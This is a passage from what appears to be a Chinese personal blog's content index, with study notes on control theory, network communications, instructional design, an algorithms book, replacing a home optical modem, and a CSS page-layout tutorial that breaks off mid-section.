<h1 id="现代控制理论"><a href="#现代控制理论" class="headerlink" title="现代控制理论"></a>现代控制理论</h1><p>经典控制理论以频域分析为主，而现代控制理论利用时域的状态空间表示法，将系统中的输入、输出及状态变量之间的关系用一阶的微分方程表示。为了抽象化输入、输出及状态变量的数量，这些变量一般会用向量来表示，而微分方程或代数方程（当系统是线性时）则会以矩阵形式表示。状态空间表示法也称为时域分析，提供一个方便且简洁的方式针对多重输入及输出的系统建模及分析，在有输入和输出时，也可以利用拉氏转换，将系统所有的资料包括在其中。现代控制理论不同于频域分析，可以分析非线性或不是零初始条件的系统。状态空间就是指坐标轴为状态变量的空间，系统的状态可以表示为状态空间中的一个向量。</p>
<h1 id="控制理论主题"><a href="#控制理论主题" class="headerlink" title="控制理论主题"></a>控制理论主题</h1><h2 id="稳定性"><a href="#稳定性" class="headerlink" title="稳定性"></a>稳定性</h2><p>在控制理论中的稳定性是指控制系统的状态在特定条件下，可以维持在一定的范围内，不会发散，而在什么范围内才算是稳定则依系统种类而不同。</p>
<ul>
<li>没有输入信号的动力系统，其稳定性是用李雅普诺夫稳定性来描述，也就是任何初始条件在 $x_{0}$ 附近的轨迹均能维持在 $x_{0}$ 附近</li>
<li>有输入信号的线性系统，其稳定性是用有界输入有界输出稳定性（BIBO 稳定性）来描述，针对任何有界的输入信号，其输出也是有界。</li>
<li>有输入信号的非线性系统，其稳定性是用输入-状态稳定性（input-to-state stability），结合了李雅普诺夫稳定性及类似有界输入有界输出稳定性的表示方式。</li>
</ul>
<h2 id="可控制性及可观测性"><a href="#可控制性及可观测性" class="headerlink" title="可控制性及可观测性"></a>可控制性及可观测性</h2><p>可控制性和可观测性分别是输入和状态，输出和状态之间的性质。是在分析控制系统，决定控制策略或判断是否可以使系统稳定时所需要的重要性质。</p>
<p>可控制性是指是可以用适当的控制信号作为输入，使特定状态变量的数值变成０，和利用输入调整状态变量的能力有关，若一个状态变量是不可控制的，表示没有输入可以调整这一个状态，若一系统中所有不可控制的状态变量，其动态特性都是稳定的，则此系统称为可稳定的（stabilizable）。</p>
<p>可观测性是指可以用输出的量测及计算得到状态变量的值，若一个状态变量是不可观测的，表示无法确认此一状态是否稳定，也就无法用此状态来稳定整个系统。若一系统中所有不可控制的观测变量都是稳定的，则此系统称为可检测的（detectable）。</p>
<h2 id="控制规格"><a href="#控制规格" class="headerlink" title="控制规格"></a>控制规格</h2><p>在控制原理的基础下，已发展出许多不同的控制策略，从非常通用的（PID控制器），到针对特殊系统的控制，尤其是机器人或是航空器的巡航定速控制。</p>
<p>一个控制问题会有许多的规格，其中稳定性是必要条件的，不论系统开环稳定性如何，控制器需确保在闭环下是稳定的。性能不佳或是调整不当的控制器可能使系统变的不稳定，甚至可能比开环还要不稳定，这是应尽量要避免的。</p>
<h2 id="模型识别及鲁棒性"><a href="#模型识别及鲁棒性" class="headerlink" title="模型识别及鲁棒性"></a>模型识别及鲁棒性</h2><p>控制系统一定会有一定程度的鲁棒性。控制器一般是依照一个假设的受控系统模组再进行设计，鲁棒性是指一控制器配合的受控系统和原来假设的系统有一点不同，控制器的特性不会有太大的变化。这个规格在实际的控制器中相当重要，因为很少实际系统会完全符合描述它的微分方程，在选择系统数学模型时，一般会进行简化，否则数学模型会非常复杂，甚至无法求得一个完整的模型。</p>
<h1 id="系统分类"><a href="#系统分类" class="headerlink" title="系统分类"></a>系统分类</h1><h2 id="线性系统控制"><a href="#线性系统控制" class="headerlink" title="线性系统控制"></a>线性系统控制</h2><p>针对MIMO的系统，极点的指定可以用开环系统的状态空间，再将极点放在指定位置，计算对应的回授矩阵。若在复杂的系统中，上述的程序需要用电脑辅助计算才能达到，而且不保证其鲁棒性。而且一般而言无法量到所有的系统状态，在极点指定的设计时需加入观测器（observer）的设计。</p>
<h2 id="非线性系统控制"><a href="#非线性系统控制" class="headerlink" title="非线性系统控制"></a>非线性系统控制</h2><p>像机器人学及航天产业中的程序一般都有高度非线性的动态，在控制理论中有时可以用线性化的方式转换为线性系统，再依线性系统的方式控制。但有时需要用一些可以配合非线性系统使用的非线性控制理论，例如回授线性化、反推控制、滑动模式控制等。轨迹线性化控制一般利用李亚普诺夫稳定性的基础。微分几何用做为一数学工具，将许多广为人知的线性控制概念扩展到非线性控制中，但其中又有其微妙之处，因此变成一个更有挑战性的问题。</p>
<h2 id="分散式系统"><a href="#分散式系统" class="headerlink" title="分散式系统"></a>分散式系统</h2><p>分散控制系统是指一个系统由多个控制器来控制。分散控制有几个好处，例如可以控制一个位在广大地理区域的系统，各控制器之间可以用通讯网络彼此交换资料，并协调彼此的行动。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zh.wikipedia.org/wiki/%E6%8E%A7%E5%88%B6%E7%90%86%E8%AE%BA" target="_blank" rel="noopener">控制理论</a>,by wikipedia.</li>
<li><a href="https://zhuanlan.zhihu.com/p/34908368" target="_blank" rel="noopener">「珂学原理」精选：经典控制和现代控制理论有何本质区别？</a>,by 王珂.</li>
<li><a href="https://zh.wikipedia.org/wiki/%E6%8B%89%E6%99%AE%E6%8B%89%E6%96%AF%E5%8F%98%E6%8D%A2" target="_blank" rel="noopener">拉普拉斯变换</a>,by wikipedia.</li>
<li><a href="https://huangwang.github.io/2019/02/09/PID%E6%8E%A7%E5%88%B6%E7%AE%97%E6%B3%95%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/">PID控制算法原理分析</a>,by jackhuang.</li>
<li><a href="https://blog.csdn.net/jk_101/article/details/107362329" target="_blank" rel="noopener">Matlab中margin函数使用</a>,by jk_101.</li>
<li><a href="https://www.zhihu.com/question/27347401" target="_blank" rel="noopener">伯德图中的相角裕量和幅值裕量有什么物理意义？</a>,by zhihu.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>控制理论</tag>
      </tags>
  </entry>
  <entry>
    <title>红外点源目标探测仿真</title>
    <url>/2019/12/11/%E7%BA%A2%E5%A4%96%E7%82%B9%E6%BA%90%E7%9B%AE%E6%A0%87%E6%8E%A2%E6%B5%8B%E4%BB%BF%E7%9C%9F/</url>
    <content><![CDATA[<p>红外点源目标探测仿真过程中遇到两个问题：一是哪些目标重合到一块，二是如何计算重合目标的中心和半径。这两个问题可分别通过计算图连通分量的算法和最小圆覆盖算法解决。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/wu_tongtong/article/details/79362339" target="_blank" rel="noopener">最小圆覆盖（经典算法【三点定圆）</a>,by Coco_T_.</li>
<li><a href="https://blog.csdn.net/EsonJohn/article/details/52403185" target="_blank" rel="noopener">利用邻接矩阵求解无向图的连通分支的个数</a>,by EsonJohn.</li>
<li><a href="http://blog.letow.top/2017/11/13/vector-cross-product-cal-intersection/" target="_blank" rel="noopener">使用向量叉乘判断线段是否相交并求交点</a>,by leto.</li>
<li><a href="https://sylvanassun.github.io/2017/07/18/2017-07-18-Graph_UndirectedGraph/" target="_blank" rel="noopener">图的那点事儿(1)-无向图</a>,by SylvanasSun.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>简明教学设计11讲读书笔记</title>
    <url>/2023/01/05/%E7%AE%80%E6%98%8E%E6%95%99%E5%AD%A6%E8%AE%BE%E8%AE%A111%E8%AE%B2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="教学法分类"><a href="#教学法分类" class="headerlink" title="教学法分类"></a>教学法分类</h1><ul>
<li>讲授法</li>
<li>直导式</li>
<li>指导发现式</li>
<li>探究式</li>
</ul>
<h2 id="三大学习理论"><a href="#三大学习理论" class="headerlink" title="三大学习理论"></a>三大学习理论</h2><ul>
<li>吸收理论</li>
<li>行为理论</li>
<li>认知理论</li>
</ul>
<h1 id="教学目标"><a href="#教学目标" class="headerlink" title="教学目标"></a>教学目标</h1><p>布鲁姆教学目标分类：</p>
<ul>
<li>知道</li>
<li>理解</li>
<li>应用</li>
<li>分析</li>
<li>综合</li>
<li>评价</li>
</ul>
<p>学习内容分类：</p>
<ul>
<li>知识</li>
</ul>
<p>分为事实性知识和概念性知识。事实性知识分为事实和程序，概念性知识分为概念和原理。</p>
<ul>
<li>技能</li>
</ul>
<p>分为动作技能、认知技能、交互技能。</p>
<ul>
<li>情感</li>
</ul>
<p>情感、态度和价值观。</p>
<h1 id="教学过程设计"><a href="#教学过程设计" class="headerlink" title="教学过程设计"></a>教学过程设计</h1><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><ul>
<li>安心学习</li>
<li>激发学习动机</li>
</ul>
<h2 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h2><ul>
<li>抓住注意力</li>
<li>激活旧知</li>
<li>组织教学内容</li>
<li>轻教学</li>
</ul>
<h2 id="加工"><a href="#加工" class="headerlink" title="加工"></a>加工</h2><ul>
<li>以问题开始</li>
<li>以对话维持</li>
<li>以反思检视</li>
</ul>
<h2 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h2><h2 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h2><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://books.google.co.kr/books/about/%E7%AE%80%E6%98%8E%E6%95%99%E5%AD%A6%E8%AE%BE%E8%AE%A111%E8%AE%B2.html" target="_blank" rel="noopener">简明教学设计11讲</a>,by 郑杰.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>管理</tag>
        <tag>教学</tag>
      </tags>
  </entry>
  <entry>
    <title>网线的相关知识</title>
    <url>/2022/04/02/%E7%BD%91%E7%BA%BF%E7%9A%84%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<p>最近家里电信宽带免费设计到千兆了，可是一测试，网速还是百兆，问题出在哪呢？感紧学习一下，解决这个问题。</p>
<h1 id="问题原因"><a href="#问题原因" class="headerlink" title="问题原因"></a>问题原因</h1><p>家里网络是电信光猫加荣耀路由pro2，通过网络测速，发现荣耀路由pro2与光猫之间网速只有百兆。刚开始以为是荣耀路由pro2与光猫之间使用五类线的原因，后面才发现不是这个原因。真正的原因是电信光猫过于老旧，其网口是百兆口。看来只能换新的拥有千兆网口的光猫了。</p>
<h1 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h1><p>换光猫步骤如下：</p>
<ul>
<li>获得老光猫的LOID和Password。</li>
<li>新光猫恢复出厂设置后，连接新光猫。</li>
<li>使用老光猫的LOID和Password，注册新光猫。</li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zhuanlan.zhihu.com/p/426769369" target="_blank" rel="noopener">为什么网线传输不超过一百米？</a>,by 武汉格凌科技.</li>
<li><a href="https://zhuanlan.zhihu.com/p/337078514" target="_blank" rel="noopener">千兆宽带配什么网线？终于有人讲清楚了</a>,by 上海电信.</li>
<li><a href="https://consumer.huawei.com/cn/support/content/zh-cn01009554/" target="_blank" rel="noopener">路由器 Wi-Fi 实际测试速率达不到宣传的 Wi-Fi 最高速率</a>,by huawei.</li>
<li><a href="https://zhuanlan.zhihu.com/p/136479005" target="_blank" rel="noopener">Cat5e，超五类线到底能不能支持千兆？</a>,by 猿某人.</li>
<li><a href="https://post.smzdm.com/p/andg0l20/" target="_blank" rel="noopener">老房子WiFi布网攻略 篇四：IPTV无线化——光猫更换指南</a>,by qianseyue.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>网络通信知识学习笔记</title>
    <url>/2023/02/20/%E7%BD%91%E7%BB%9C%E9%80%9A%E4%BF%A1%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="VLAN"><a href="#VLAN" class="headerlink" title="VLAN"></a>VLAN</h1><p>请参考<a href="https://zhuanlan.zhihu.com/p/35616289" target="_blank" rel="noopener">VLAN 基础知识</a>和<a href="https://info.support.huawei.com/info-finder/encyclopedia/zh/VLAN.html" target="_blank" rel="noopener">什么是VLAN</a>。</p>
<h1 id="无线数字通信中数据速率、载波频率和带宽的关系"><a href="#无线数字通信中数据速率、载波频率和带宽的关系" class="headerlink" title="无线数字通信中数据速率、载波频率和带宽的关系"></a>无线数字通信中数据速率、载波频率和带宽的关系</h1><p>请参考<a href="https://www.zhihu.com/question/23115645" target="_blank" rel="noopener">无线通信系统中数据带宽、载波频率和载波带宽的关系怎样理解？</a>和<a href="https://zhuanlan.zhihu.com/p/53760015" target="_blank" rel="noopener">无线数字通信中数据速率、载波频率和带宽的关系</a>。</p>
<h2 id="香农定理"><a href="#香农定理" class="headerlink" title="香农定理"></a>香农定理</h2><p>香农定理给出了信道信息传送速率的上限（比特每秒）和信道信噪比及带宽的关系。香农定理可以解释现代各种无线制式由于带宽不同，所支持的单载波最大吞吐量的不同。</p>
<p>在有随机热噪声的信道上传输数据信号时，信道容量$R_{max}$与信道带宽W，信噪比S/N关系为：<br> $$R_{max}=W*log2(1+S/N)$$</p>
<p>注意这里的log2是以2为底的对数。</p>
<h2 id="奈奎斯特准则"><a href="#奈奎斯特准则" class="headerlink" title="奈奎斯特准则"></a>奈奎斯特准则</h2><p>对于一个带宽为W（Hz）的无噪声低通信道，最高的码元传输速率Bmax:</p>
<p>$$B_{max}=2W(Baud)$$</p>
<p>即每赫兹带宽的理想低通信道的最高码元传输速率是每秒2个码元。</p>
<h2 id="载波"><a href="#载波" class="headerlink" title="载波"></a>载波</h2><p>载波（carrier wave）是指被调制以传输信号的波形，一般为正弦波。一般要求正弦载波的频率远远高于调制信号的带宽，否则会发生混叠，使传输信号失真。 可以这样理解，我们一般需要发送的数据的频率是低频的，如果按照本身的数据的频率来传输，不利于接收和同步。使用载波传输，我们可以将数据的信号加载到载波的信号上，接收方按照载波的频率来接收数据信号，有意义的信号波的波幅与无意义的信号的波幅是不同的，将这些信号提取出来就是我们需要的数据信号。 载波就是携带信息/信号的波形，它携带的方式是进行频率、振幅、相位间隔调制。</p>
<p>电子计算机科学中，基频（baseband）加上载波（carrier wave）而成为宽频（broadband）。</p>
<p>载波是信号调制与发射的载体，它只有一个中心频率，和带宽本身没任何关系。比如11n协议规定可以工作在2G频段，也可以工作在5G频段，其他因素都一样的。假定20M带宽，工作在2G频段的时候载波频率是2.4GHz，那它实际占用的频谱资源是2.390GHz-2.410GHz。工作在5G频段的时候载波频率是5GHz，那它实际占用的频谱资源是4.990GHz-5.010GHz。</p>
<h1 id="调制"><a href="#调制" class="headerlink" title="调制"></a>调制</h1><h2 id="模拟信号调制"><a href="#模拟信号调制" class="headerlink" title="模拟信号调制"></a>模拟信号调制</h2><p>请参考<a href="https://zh.wikipedia.org/wiki/%E6%8C%AF%E5%B9%85%E8%AA%BF%E8%AE%8A" target="_blank" rel="noopener">幅度调制</a>。</p>
<h2 id="数字信号调制"><a href="#数字信号调制" class="headerlink" title="数字信号调制"></a>数字信号调制</h2><p>请参考<a href="https://blog.csdn.net/qq_34840129/article/details/88785772" target="_blank" rel="noopener">数字调制的原理</a>。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zhuanlan.zhihu.com/p/35616289" target="_blank" rel="noopener">VLAN 基础知识</a>,by 行道科技.</li>
<li><a href="https://info.support.huawei.com/info-finder/encyclopedia/zh/VLAN.html" target="_blank" rel="noopener">什么是VLAN</a>,by huawei.</li>
<li><a href="https://segmentfault.com/a/1190000022099473" target="_blank" rel="noopener">集线器、交换机、路由器、网桥、网关之间的区别和联系</a>,by danielxue7.</li>
<li><a href="https://www.zhihu.com/question/20485878" target="_blank" rel="noopener">带宽和频率的关系到底是什么？</a>,by zhihu.</li>
<li><a href="https://www.zhihu.com/question/23115645" target="_blank" rel="noopener">无线通信系统中数据带宽、载波频率和载波带宽的关系怎样理解？</a>,by zhihu.</li>
<li><a href="https://zhuanlan.zhihu.com/p/53760015" target="_blank" rel="noopener">无线数字通信中数据速率、载波频率和带宽的关系</a>,by furious.</li>
<li><a href="https://zh.wikipedia.org/zh-cn/%E8%AA%BF%E8%AE%8A" target="_blank" rel="noopener">调制</a>,by wikipedia.</li>
<li><a href="https://baike.baidu.com/item/%E6%95%B0%E5%AD%97%E4%BF%A1%E5%8F%B7/915663" target="_blank" rel="noopener">数字信号</a>,by baidubaike.</li>
<li><a href="https://blog.csdn.net/qq_34840129/article/details/88785772" target="_blank" rel="noopener">数字调制的原理</a>,by bebr.</li>
<li><a href="https://zh.wikipedia.org/wiki/%E6%8C%AF%E5%B9%85%E8%AA%BF%E8%AE%8A" target="_blank" rel="noopener">幅度调制</a>,by wikipedia.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>算法之美_指导工作和生活的算法读书笔记</title>
    <url>/2023/01/25/%E7%AE%97%E6%B3%95%E4%B9%8B%E7%BE%8E-%E6%8C%87%E5%AF%BC%E5%B7%A5%E4%BD%9C%E5%92%8C%E7%94%9F%E6%B4%BB%E7%9A%84%E7%AE%97%E6%B3%95%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>日积月累，水滴石穿。每天读几页书，也是一种乐趣。下面记录一下算法之美这本书的一些知识。</p>
<h1 id="最优停止理论-如何选择停止观望的时机？"><a href="#最优停止理论-如何选择停止观望的时机？" class="headerlink" title="最优停止理论 如何选择停止观望的时机？"></a>最优停止理论 如何选择停止观望的时机？</h1><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><ul>
<li>秘书问题</li>
<li>最优停车位置</li>
</ul>
<h2 id="策略"><a href="#策略" class="headerlink" title="策略"></a>策略</h2><ul>
<li>look then leap rule</li>
<li>37% 法则</li>
</ul>
<h1 id="探索与利用-要最新的还是要最好的？"><a href="#探索与利用-要最新的还是要最好的？" class="headerlink" title="探索与利用 要最新的还是要最好的？"></a>探索与利用 要最新的还是要最好的？</h1><h2 id="问题-1"><a href="#问题-1" class="headerlink" title="问题"></a>问题</h2><ul>
<li>explore and exploit</li>
</ul>
<p>explore即探索，收集信息，exploit即利用，利用已收集信息。</p>
<ul>
<li>多臂老虎机问题</li>
</ul>
<p>老虎机（slot machine） 是一种用零钱赌博的机器，因为上面有老虎图案的筹码而得名。老虎机有三个玻璃框，里面有不同的图案，投币之后拉下拉杆，就会开始转，如果出现特定的图形（比如三个相同）就会吐钱出来，出现相同图型越多奖金则越高。</p>
<h2 id="策略-1"><a href="#策略-1" class="headerlink" title="策略"></a>策略</h2><ul>
<li>赢留输变</li>
<li>基廷斯指数</li>
<li>上限置信区间</li>
<li>A/B测试</li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://book.douban.com/subject/30155731/" target="_blank" rel="noopener">算法之美</a>,by  布莱恩·克里斯汀, 汤姆·格里菲思.</li>
<li><a href="https://baike.baidu.com/item/%E8%80%81%E8%99%8E%E6%9C%BA/4764051" target="_blank" rel="noopener">老虎机</a>,by baike.</li>
<li><a href="https://baike.baidu.com/item/AB%E6%B5%8B%E8%AF%95/9231223" target="_blank" rel="noopener">AB测试</a>,by baike.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>网页布局方法入门</title>
    <url>/2019/08/10/%E7%BD%91%E9%A1%B5%E5%B8%83%E5%B1%80%E6%96%B9%E6%B3%95%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<p>使用CSS对网页布局进行设计是前端工程师的重要工作。下面即介绍各种CSS网页布局的方法，以及相应的技术。</p>
<h1 id="居中方法"><a href="#居中方法" class="headerlink" title="居中方法"></a>居中方法</h1><p>居中在布局中很常见，假设DOM文档结构如下，子元素要在父元素中居中：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div class&#x3D;&quot;parent&quot;&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;child&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure>

<h2 id="水平居中"><a href="#水平居中" class="headerlink" title="水平居中"></a>水平居中</h2><p>子元素为行内元素还是块状元素，宽度一定还是宽度未定，采取的布局方案不同。以下即根据子元素的类型给出对应水平居中方法：</p>
<ul>
<li><strong>行内元素</strong>：对父元素设置text-align:center;</li>
<li><strong>定宽块状元素</strong>: 设置左右margin值为auto;</li>
<li><strong>不定宽块状元素</strong>: 设置子元素为display:inline,然后在父元素上设置text-align:center;</li>
<li><strong>通用方案</strong>: flex布局，对父元素设置display:flex;justify-content:center;</li>
</ul>
<h2 id="垂直居中"><a href="#垂直居中" class="headerlink" title="垂直居中"></a>垂直居中</h2><p>垂直居中对于子元素是单行内联文本、多行内联文本以及块状元素采用的方案是不同的。具体方法如下：</p>
<ul>
<li><strong>父元素一定，子元素为单行内联文本</strong>：设置父元素的height等于行高line-height</li>
<li><strong>父元素一定，子元素为多行内联文本</strong>：设置父元素的display:table-cell或inline-block，再设置vertical-align:middle;</li>
<li><strong>块状元素</strong>:设置子元素position:absolute 并设置top、bottom为0，父元素要设置定位为static以外的值，margin:auto;</li>
</ul>
<h1 id="单列布局"><a href="#单列布局" class="headerlink" title="单列布局"></a>单列布局</h1><p>单列布局如图1所示，可分成两种类型，有定宽、水平居中的特点。</p>
<ul>
<li>一种是header、content、footer宽度都相同，其一般不会占满浏览器的最宽宽度，但当浏览器宽度缩小低于其最大宽度时，宽度会自适应。</li>
<li>一种是header、footer宽度为浏览器宽度，但content以及header和footer里的内容却不会占满浏览器宽度。</li>
</ul>
<p align="center">
    <img src="images/layout1.png" width="60%" alt="单列布局的两种形式"/>
</p>
<center>图1 单列布局的两种形式</center>

<p>对于第一种，对header、content、footer统一设置width或max-width，并通过margin:auto实现居中。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div class&#x3D;&quot;layout&quot;&gt;</span><br><span class="line">  &lt;div id&#x3D;&quot;header&quot;&gt;头部&lt;&#x2F;div&gt;</span><br><span class="line">  &lt;div id&#x3D;&quot;content&quot;&gt;内容&lt;&#x2F;div&gt;</span><br><span class="line">  &lt;div id&#x3D;&quot;footer&quot;&gt;尾部&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.layout&#123;</span><br><span class="line">  &#x2F;*   width: 960px; *&#x2F;&#x2F;*设置width当浏览器窗口宽度小于960px时，单列布局不会自适应。*&#x2F;</span><br><span class="line">    max-width: 960px;</span><br><span class="line">    margin: 0 auto;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>对于第二种，header、footer的内容宽度为100%，但header、footer的内容区以及content统一设置width 或 max-width，并通过margin:auto实现居中。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div id&#x3D;&quot;header&quot;&gt;</span><br><span class="line">  &lt;div class&#x3D;&quot;layout&quot;&gt;头部&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;div id&#x3D;&quot;content&quot; class&#x3D;&quot;layout&quot;&gt;内容&lt;&#x2F;div&gt;</span><br><span class="line">&lt;div id&#x3D;&quot;footer&quot;&gt;</span><br><span class="line">  &lt;div class&#x3D;&quot;layout&quot;&gt;尾部&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.layout&#123;</span><br><span class="line">  &#x2F;*   width: 960px; *&#x2F;&#x2F;*设置width当浏览器窗口宽度小于960px时，单列布局不会自适应。*&#x2F;</span><br><span class="line">    max-width: 960px;</span><br><span class="line">    margin: 0 auto;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<h1 id="二列-amp-三列布局"><a href="#二列-amp-三列布局" class="headerlink" title="二列&amp;三列布局"></a>二列&amp;三列布局</h1><p><strong>二列布局的特征是侧栏固定宽度，主栏自适应宽度。三列布局的特征是两侧两列固定宽度，中间列自适应宽度。</strong> 之所以将二列布局和三列布局写在一起，是因为二列布局可以看做去掉一个侧栏的三列布局，其布局的思想有异曲同工之妙。</p>
<p>对于传统的实现方法，主要讨论上图2中前三种布局，经典的带有侧栏的二栏布局以及带有左右侧栏的三栏布局。使用flex技术，可实现图2的五种布局。</p>
<p align="center">
    <img src="images/layout2.png" width="60%" alt="二列&三列布局"/>
</p>
<center>图2  二列&三列布局</center>

<p>实现二列&amp;三列布局的CSS技术主要有：</p>
<h2 id="float-margin"><a href="#float-margin" class="headerlink" title="float+margin"></a>float+margin</h2><p>原理说明：设置两个侧栏分别向左向右浮动，中间列通过外边距给两个侧栏腾出空间，中间列的宽度根据浏览器窗口自适应。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div id&#x3D;&quot;content&quot;&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;sub&quot;&gt;sub&lt;&#x2F;div&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;extra&quot;&gt;extra&lt;&#x2F;div&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;main&quot;&gt;main&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.sub&#123;</span><br><span class="line">    width: 100px;</span><br><span class="line">    float: left;</span><br><span class="line">&#125;</span><br><span class="line">.extra&#123;</span><br><span class="line">    width: 200px;</span><br><span class="line">    float: right;</span><br><span class="line">&#125;</span><br><span class="line">.main&#123;</span><br><span class="line">    margin-left: 100px; </span><br><span class="line">    margin-right: 200px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意：</p>
<ul>
<li>DOM文档的书写顺序，先写两侧栏，再写主面板，更换后则侧栏会被挤到下一列（圣杯布局和双飞翼布局都会用到）。 　</li>
<li>这种布局方式比较简单明了，但缺点是渲染时先渲染了侧边栏，而不是比较重要的主面板。</li>
</ul>
<h2 id="position-margin"><a href="#position-margin" class="headerlink" title="position+margin"></a>position+margin</h2><p>原理说明：通过绝对定位将两个侧栏固定，同样通过外边距给两个侧栏腾出空间，中间列自适应。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div class&#x3D;&quot;sub&quot;&gt;left&lt;&#x2F;div&gt;</span><br><span class="line">&lt;div class&#x3D;&quot;main&quot;&gt;main&lt;&#x2F;div&gt;</span><br><span class="line">&lt;div class&#x3D;&quot;extra&quot;&gt;right&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.sub, .extra &#123;</span><br><span class="line">    position: absolute;</span><br><span class="line">    top: 0; </span><br><span class="line">    width: 200px;</span><br><span class="line">&#125;</span><br><span class="line">.sub &#123; </span><br><span class="line">    left: 0;</span><br><span class="line">&#125;</span><br><span class="line">.extra &#123; </span><br><span class="line">    right: 0; </span><br><span class="line">&#125;</span><br><span class="line">.main &#123; </span><br><span class="line">    margin: 0 200px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意：</p>
<ul>
<li>本方法不限制DOM书写顺序，先写主面板会使主面板部分优先渲染（一般主面板会比侧栏内容重要）。</li>
<li>与上一种方法相比，本种方法是通过定位来实现侧栏的位置固定。</li>
<li>如果中间栏含有最小宽度限制，或是含有宽度的内部元素，则浏览器窗口小到一定程度，主面板与侧栏会发生重叠。</li>
</ul>
<h2 id="圣杯布局-float-负margin"><a href="#圣杯布局-float-负margin" class="headerlink" title="圣杯布局(float + 负margin)"></a>圣杯布局(float + 负margin)</h2><p>原理说明：</p>
<p>主面板设置宽度为100%，主面板与两个侧栏都设置浮动，常见为左浮动，这时两个侧栏会被主面板挤下去。通过负边距将浮动的侧栏拉上来，左侧栏的负边距为100%，刚好是窗口的宽度，因此会从主面板下面的左边跑到与主面板对齐的左边，右侧栏此时浮动在主面板下面的左边，设置负边距为负的自身宽度刚好浮动到主面板对齐的右边。为了避免侧栏遮挡主面板内容，在外层设置左右padding值为左右侧栏的宽度，给侧栏腾出空间，此时主面板的宽度减小。由于侧栏的负margin都是相对主面板的，两个侧栏并不会像我们理想中的停靠在左右两边，而是跟着缩小的主面板一起向中间靠拢。此时使用相对布局，调整两个侧栏到相应的位置。</p>
<h2 id="双飞翼布局-float-负margin"><a href="#双飞翼布局-float-负margin" class="headerlink" title="双飞翼布局(float + 负margin )"></a>双飞翼布局(float + 负margin )</h2><p>原理说明：</p>
<p>双飞翼布局和圣杯布局的思想有些相似，都利用了浮动和负边距，但双飞翼布局在圣杯布局上做了改进，在main元素上加了一层div, 并设置margin,由于两侧栏的负边距都是相对于main-wrap而言，main的margin值变化便不会影响两个侧栏，因此省掉了对两侧栏设置相对布局的步骤。</p>
<h2 id="flex布局"><a href="#flex布局" class="headerlink" title="flex布局"></a>flex布局</h2><p>与之前所讲的几种传统布局方案相比，flex布局的代码可谓异常简洁，而且非常通用，利用简单的三行CSS即实现了常见的五种布局。</p>
